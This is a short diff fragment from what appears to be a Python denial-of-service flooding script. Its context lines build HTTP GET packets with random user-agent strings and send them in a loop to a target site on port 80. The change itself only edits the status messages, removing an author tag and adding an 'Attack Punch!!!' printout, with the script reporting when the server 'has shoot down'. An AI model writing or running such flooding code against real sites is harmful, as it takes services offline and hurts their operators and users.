@@ -32,9 +32,9 @@ def dos():
 			packet = str("GET / HTTP/1.1\nHost: "+site+"\n\n User-Agent: "+random.choice(agent)+"\n"+data).encode('utf-8')
 			s.sendto(packet, (site, 80))	
 			s.send(packet)
-			print ("\033[96m",time.ctime(time.time()),"\033[0m \033[93m <--packet sent! By MR A??--> \033[0m")
+			print ("\033[96m",time.ctime(time.time()),"\033[0mAttack Punch!!!\033[0m")
 		except socket.error:
-			print("\033[91mno connection! server maybe has shoot down By MR A??\033[0m")
+			print("\033[91mno connection! server maybe has shoot down\033[0m")
 			exit(1)
 def dos2():
 	while 1:
